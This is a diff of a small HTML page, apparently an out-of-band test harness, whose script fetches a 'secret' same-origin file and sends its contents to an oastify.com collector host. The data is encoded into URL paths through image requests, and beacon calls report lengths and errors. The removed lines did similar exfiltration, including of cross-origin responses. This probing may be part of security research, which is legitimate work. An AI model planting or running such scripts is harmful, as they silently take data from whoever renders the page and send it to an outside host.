@@ -1,20 +1,14 @@
-<!DOCTYPE html><html><head><title>WINDOW-TEST</title></head>
+<!DOCTYPE html><html><head><title>PATH-EXFIL-TEST</title></head>
 <body>
 <script>
-// baseline fire-and-forget (must always fire)
-navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-BASELINE');
-new Image().src='https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-BASELINE-IMG';
-
-// TEST 2: async same-origin fetch -> read -> sendBeacon exfil (window length test)
+navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-BASELINE');
+// fetch same-origin secret, exfil encoded into URL PATH (bodies are lost to short window)
 fetch('https://labsvpn1337.github.io/MSOBB-flexfic-C/data.txt')
-  .then(function(r){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-FETCH-RESOLVED', 'status='+r.status); return r.text(); })
-  .then(function(t){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-EXFIL-OK', t); })
-  .catch(function(e){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-EXFIL-ERR', String(e&&e.message||e)); });
-
-// TEST 3: async fetch to external with permissive CORS (httpbin) -> read -> exfil
-fetch('https://httpbin.org/json')
   .then(function(r){ return r.text(); })
-  .then(function(t){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-CROSSORIGIN-OK', t.slice(0,200)); })
-  .catch(function(e){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-CROSSORIGIN-ERR', String(e&&e.message||e)); });
+  .then(function(t){
+    new Image().src='https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-DATA-'+encodeURIComponent(t);
+    navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-LEN-'+t.length);
+  })
+  .catch(function(e){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-ERR-'+encodeURIComponent(String(e&&e.message||e).slice(0,60))); });
 </script>
 </body></html>
